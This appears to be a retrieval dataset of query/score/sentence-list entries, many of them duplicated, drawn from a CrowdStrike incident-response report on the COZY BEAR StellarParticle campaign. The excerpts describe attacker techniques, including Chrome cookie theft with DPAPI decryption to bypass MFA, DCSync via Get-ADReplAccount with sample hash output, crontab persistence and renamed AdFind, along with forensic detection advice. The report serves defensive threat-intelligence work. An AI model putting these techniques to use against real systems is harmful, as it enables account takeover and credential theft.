HTTP requests TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.', 'The malware shares high-level functionality with other malware families.', 'In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously 6/21observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST.']
a given user account was also authenticating to Active Directory from a given source IP address two years prior|0.8768112017520072|['One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.', 'An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found here.', 'In multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data.', 'Even though its only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system.', 'For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access.', 'This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.', 'Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.', 'TrailBlazer and GoldMax Throughout StellarParticle-related investigations, CrowdStrike has identified two sophisticated malware families that were placed on victim systems in the mid-2019 timeframe: a Linux variant of GoldMax and a completely new family CrowdStrike refers to as TrailBlazer.', 'TrailBlazer Attempted to blend in with a file name that matched the system name it resided on Configured for WMI persistence (generally uncommon in 2019) Used likely compromised infrastructure for C2 Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.', 'The malware shares high-level functionality with other malware families.', 'In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously 6/21observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST.']
to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.|0.8612544049638168|['However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especially infrequent destinations for accounts.', '(Read how CrowdStrike incident responders leverage the module in investigations in this blog: Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.)', 'But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike?', 'Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.', 'The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.', 'In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.', 'The user-specific encryption keys for DPAPI are stored under C:\\\\Users\\\\<user>\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\ .', 'To leverage these encryption keys, the threat actor must first decrypt them, either by using the user accounts Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.', 'Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the users DPAPI key.', 'The cookies were then added to a new session using a Cookie Editor Chrome extension that the threat actor installed on victim systems and removed after using.']
to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.|0.8612544049638168|['However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especially infrequent destinations for accounts.', '(Read how CrowdStrike incident responders leverage the module in investigations in this blog: Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.)', 'But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike?', 'Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.', 'The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.', 'In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.', 'The user-specific encryption keys for DPAPI are stored under C:\\\\Users\\\\<user>\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\ .', 'To leverage these encryption keys, the threat actor must first decrypt them, either by using the user accounts Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.', 'Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the users DPAPI key.', 'The cookies were then added to a new session using a Cookie Editor Chrome extension that the threat actor installed on victim systems and removed after using.']
to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.|0.8612544049638168|['In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such asCrowdStrike Falcon Identity Threat Detectionwould help identify these anomalous logons and especially infrequent destinations for accounts.', '(Read how CrowdStrike incident responders leverage the module in investigations in this blog:Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.', ')But how had the threat actor succeeded in authenticating into victim O365 tenants, whenmultifactor authentication(MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike?Cookie Theft to Bypass MFAEven though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.', 'The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.', 'In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.', 'The user-specific encryption keys for DPAPI are stored underC:\\\\Users\\\\<user>\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\.', 'To leverage these encryption keys, the threat actor must first decrypt them, either by using the user accounts Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the users DPAPI key.', 'The cookies were then added to a new session using a Cookie Editor Chrome extension that the threat actor installed on victim systems and removed after using.Shellbags, Falcon Telemetry and RDP Bitmap CacheFrom a forensic standpoint, the use of the Cookie Editor Chrome extension would have been challenging to identify, due to the threat actors penchant for strict operational security.', 'This activity was identified via aNewScriptWrittenevent within Falcon when a JavaScript file was written to disk by a threat actor-initiated Chrome process.']
the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.|0.9256005923690784|['TA Masquerading of System Names During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victims environment.', 'This again showed a strong knowledge of the victims internal environment on the part of the threat actor.', 'Not only did the masqueraded hostnames follow the correct naming convention from a broad perspective, they were also valid in terms of what would be expected for the user account the threat actor leveraged (i.e., in terms of the site name and asset type indicated in the hostname).', 'This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations.', '13/21Credential Theft Using Get-ADReplAccount In one example, the threat actor connected into the victims environment via a VPN endpoint that did not have MFA enabled.', 'Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.', 'The threat actor subsequently ran the DSInternals command Get- ADReplAccount targeting two of the victims domains.', 'This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.', 'A common name for this particular technique is DCSync.11 An example output from Get-AdReplAccount is below: 14/21DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local Sid: S-1-5-21-1432446722-301123485-1266542393-2012 Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567 SamAccountName: TestUser SamAccountType: User UserPrincipalName: TestUser@demo.local PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl: NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: Hash 01: 12227358dd7013c7dbdbd8fdcc0c6668 Hash 02: 6a028636a6f52491424586bb88357f7c Hash 03: c13ef7347853dc3be7e7259fdc8818a1 Hash 04: 6635151746869ce485246037747adae1 Hash 05: 85543f498b007e07a3da662c8a9d450b SupplementalCredentials: ClearText: NTLMStrongHash: de164e3465f163e846a5e1c22a5ac649 Kerberos: Credentials: DES_CBC_MD5 Key: 0013364f00003915 DES_CBC_CRC Key: 0013364f00003915 OldCredentials: DES_CBC_MD5 Key: 00002a46000004bc DES_CBC_CRC Key: 00002a46000004bc Salt: demo.localTestUser Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: f67c2bcbfcfa30fccb36f72dca22a817 Iterations: 4096 DES_CBC_MD5 15/21Key: 00002f34000004ee Iterations: 4096 DES_CBC_CRC Key: 00002f34000004ee Iterations: 4096 OldCredentials: AES256_CTS_HMAC_SHA1_96 Key: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: dc34bfd5e469edbeada77fac56aa35ae Iterations: 4096 DES_CBC_MD5 Key: 0000345400000520 Iterations: 4096 DES_CBC_CRC Key: 0000345400000520 Iterations: 4096 OlderCredentials: AES256_CTS_HMAC_SHA1_96 Key: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: c38dfbd6c00b5f3b010a07f9e824fc38 Iterations: 4096 DES_CBC_MD5 Key: 000039a500000551 Iterations: 4096 DES_CBC_CRC Key: 000039a500000551 Iterations: 4096 ServiceCredentials: Salt: demo.localTestUser DefaultIterationCount: 4096 Flags: 0 WDigest: Hash 01: 83ed141ab0eaf1ff7694147ba97e1994 Hash 02: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 03: 0c228c5816a79e561d999d489499a12a Hash 04: 83ed141ab0eaf1ff7694147ba97e1994 Hash 05: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 06: 4e7c5ec6ffb6100f0c7f0bc57749bc93 Hash 07: 83ed141ab0eaf1ff7694147ba97e1994 Hash 08: 10265b08a3bb710da516832eaf64368a Hash 09: 10265b08a3bb710da516832eaf64368a Key Credentials: Credential Roaming Created: Modified: Credentials: Figure 10.', 'Get-ADReplAccount example output When executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter.', 'This was necessary, as the threat actor was targeting multiple domains.']
the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.|0.9256005923690784|['TA Masquerading of System Names During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victims environment.', 'This again showed a strong knowledge of the victims internal environment on the part of the threat actor.', 'Not only did the masqueraded hostnames follow the correct naming convention from a broad perspective, they were also valid in terms of what would be expected for the user account the threat actor leveraged (i.e., in terms of the site name and asset type indicated in the hostname).', 'This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations.', '13/21Credential Theft Using Get-ADReplAccount In one example, the threat actor connected into the victims environment via a VPN endpoint that did not have MFA enabled.', 'Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.', 'The threat actor subsequently ran the DSInternals command Get- ADReplAccount targeting two of the victims domains.', 'This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.', 'A common name for this particular technique is DCSync.11 An example output from Get-AdReplAccount is below: 14/21DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local Sid: S-1-5-21-1432446722-301123485-1266542393-2012 Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567 SamAccountName: TestUser SamAccountType: User UserPrincipalName: TestUser@demo.local PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl: NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: Hash 01: 12227358dd7013c7dbdbd8fdcc0c6668 Hash 02: 6a028636a6f52491424586bb88357f7c Hash 03: c13ef7347853dc3be7e7259fdc8818a1 Hash 04: 6635151746869ce485246037747adae1 Hash 05: 85543f498b007e07a3da662c8a9d450b SupplementalCredentials: ClearText: NTLMStrongHash: de164e3465f163e846a5e1c22a5ac649 Kerberos: Credentials: DES_CBC_MD5 Key: 0013364f00003915 DES_CBC_CRC Key: 0013364f00003915 OldCredentials: DES_CBC_MD5 Key: 00002a46000004bc DES_CBC_CRC Key: 00002a46000004bc Salt: demo.localTestUser Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: f67c2bcbfcfa30fccb36f72dca22a817 Iterations: 4096 DES_CBC_MD5 15/21Key: 00002f34000004ee Iterations: 4096 DES_CBC_CRC Key: 00002f34000004ee Iterations: 4096 OldCredentials: AES256_CTS_HMAC_SHA1_96 Key: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: dc34bfd5e469edbeada77fac56aa35ae Iterations: 4096 DES_CBC_MD5 Key: 0000345400000520 Iterations: 4096 DES_CBC_CRC Key: 0000345400000520 Iterations: 4096 OlderCredentials: AES256_CTS_HMAC_SHA1_96 Key: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: c38dfbd6c00b5f3b010a07f9e824fc38 Iterations: 4096 DES_CBC_MD5 Key: 000039a500000551 Iterations: 4096 DES_CBC_CRC Key: 000039a500000551 Iterations: 4096 ServiceCredentials: Salt: demo.localTestUser DefaultIterationCount: 4096 Flags: 0 WDigest: Hash 01: 83ed141ab0eaf1ff7694147ba97e1994 Hash 02: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 03: 0c228c5816a79e561d999d489499a12a Hash 04: 83ed141ab0eaf1ff7694147ba97e1994 Hash 05: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 06: 4e7c5ec6ffb6100f0c7f0bc57749bc93 Hash 07: 83ed141ab0eaf1ff7694147ba97e1994 Hash 08: 10265b08a3bb710da516832eaf64368a Hash 09: 10265b08a3bb710da516832eaf64368a Key Credentials: Credential Roaming Created: Modified: Credentials: Figure 10.', 'Get-ADReplAccount example output When executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter.', 'This was necessary, as the threat actor was targeting multiple domains.']
AdFind was renamed to masquerade as a legitimate Windows binary|0.9251118911098818|['While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.', 'In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.', 'In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.', 'This information provided the adversary with a list of accounts possessing particular privileges in this case, the ability to make VPN connections that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.', 'Password Policies/Hygiene In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.', 'CrowdStrike determined that in these cases, administrative users had reset their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.']
AdFind was renamed to masquerade as a legitimate Windows binary|0.9251118911098818|['While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.', 'In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.', 'In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.', 'This information provided the adversary with a list of accounts possessing particular privileges in this case, the ability to make VPN connections that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.', 'Password Policies/Hygiene In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.', 'CrowdStrike determined that in these cases, administrative users had reset their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.']
AdFind was renamed to masquerade as a legitimate Windows binary|0.9251118911098818|['At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.', 'While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executedGet-ADReplAccount, the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, includingGet-ADUserandGet-ADGroupMemberto query specific members in the directory.', 'This information provided the adversary with a list of accounts possessing particular privileges in this case, the ability to make VPN connections that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.Password Policies/HygieneIn some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.', 'CrowdStrike determined that in these cases, administrative users had reset their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.', 'This was possible even though the customers Active Directory was configured to require new passwords to be different from the previous five passwords for a given account.', 'Unfortunately, this check only applies when a user is changing their password via the password change method but if a password reset is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a users account object.12Since theGet-ADReplAccountcmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value.Close OutThe StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actors extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months and in some cases, years.A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith.Endnoteshttps://us-cert.cisa.gov/sites/default/files/publications/CISA_Fact_Sheet-Russian_SVR_Activities_Related_to_SolarWinds_Compromise_508C.pdfhttps://docs.microsoft.com/en-us/partner-center/permissions-overviewhttps://docs.microsoft.com/en-us/partner-center/announcements/2021-december#9https://attack.mitre.org/techniques/T1546/003/CrowdStrike Premium Intelligence Reporthttps://attack.mitre.org/techniques/T1213/001/https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/block-legacy-authenticationhttps://docs.microsoft.com/en-us/exchange/applicationimpersonation-role-exchange-2013-helphttps://github.com/MichaelGrafnetter/DSInternalshttps://attack.mitre.org/techniques/T1003/006/https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/bbee5135-3db2-4824-873a-55104c3610adMITRE ATT&CK FrameworkThe following table maps TTPs covered in this article to theMITRE ATT&CK framework.Indicators of Compromise (IOCs)IndicatorDetailshttp://satkas.waw[.']
directories with random names of a consistent length were navigated to by the same user that ran the tool.|0.8046184930142534|['With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.', 'Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.', 'Figure 5.', 'Crontab entry for GoldMax persistence 7/21Enumeration Tools/Unique Directory Structure Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.', 'While the scripts contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.', 'In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.', 'After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims various domains.', 'In addition, the randomly named directories are typically created in a previously existing directory thats one level off of the root of the C drive.', 'The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.', 'To date, the names of the directories have always been formed from lowercase alphanumeric characters.', 'For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where XX is a previously existing directory on the system): C:\\\\XX\\\\[a-z0-9]{6} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain.FQDN C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain-2.FQDN In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.']
directories with random names of a consistent length were navigated to by the same user that ran the tool.|0.8046184930142534|['With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.', 'Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.', 'Figure 5.', 'Crontab entry for GoldMax persistence 7/21Enumeration Tools/Unique Directory Structure Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.', 'While the scripts contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.', 'In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.', 'After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims various domains.', 'In addition, the randomly named directories are typically created in a previously existing directory thats one level off of the root of the C drive.', 'The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.', 'To date, the names of the directories have always been formed from lowercase alphanumeric characters.', 'For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where XX is a previously existing directory on the system): C:\\\\XX\\\\[a-z0-9]{6} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain.FQDN C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain-2.FQDN In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.']
The threat actor attempted to remotely list running processes on systems using tasklist.exe|0.9297692343457369|['O365 Application Impersonation Another consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation 9 role.', 'When this role was assigned to a particular user that was controlled by the threat actor, it allowed the threat actor to impersonate any user within the O365 environment.', 'These impersonated events are not logged verbosely by the Unified Audit Logs and can be difficult to detect.', 'While the assignment of these ApplicationImpersonation roles were not logged in the Unified Audit Logs, CrowdStrike was able to identify this persistence mechanism via the management role configuration settings, which can be exported with the Exchange PowerShell command: Get-ManagementRoleAssignment -Role ApplicationImpersonation .', 'CrowdStrike then analyzed the exported configuration settings and identified several users (not service accounts) that the threat actor likely gave direct ApplicationImpersonation roles during the known periods of compromise.', 'Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe .', 'As tasklist uses WMI under the hood, this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.', 'Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.', 'A sample of the information included with this event is below: 12/21Figure 9.', 'Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.', 'While unproven, its possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.']
The threat actor attempted to remotely list running processes on systems using tasklist.exe|0.9297692343457369|['O365 Application Impersonation Another consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation 9 role.', 'When this role was assigned to a particular user that was controlled by the threat actor, it allowed the threat actor to impersonate any user within the O365 environment.', 'These impersonated events are not logged verbosely by the Unified Audit Logs and can be difficult to detect.', 'While the assignment of these ApplicationImpersonation roles were not logged in the Unified Audit Logs, CrowdStrike was able to identify this persistence mechanism via the management role configuration settings, which can be exported with the Exchange PowerShell command: Get-ManagementRoleAssignment -Role ApplicationImpersonation .', 'CrowdStrike then analyzed the exported configuration settings and identified several users (not service accounts) that the threat actor likely gave direct ApplicationImpersonation roles during the known periods of compromise.', 'Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe .', 'As tasklist uses WMI under the hood, this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.', 'Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.', 'A sample of the information included with this event is below: 12/21Figure 9.', 'Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.', 'While unproven, its possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.']
the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.|0.8739938561376978|['Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe .', 'As tasklist uses WMI under the hood, this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.', 'Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.', 'A sample of the information included with this event is below: 12/21Figure 9.', 'Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.', 'While unproven, its possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.', 'This is because a current or recent Chrome session to the victims cloud tenants would be potentially beneficial in the hijacking of sessions that the threat actor performed in order to access the victims cloud resources.', 'FTP Scanning/Identity Knowledge In one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible.', 'Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful.', 'There was little to no activity during the (S)FTP sessions.', 'This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to whats described in the Credential Hopping section earlier.']
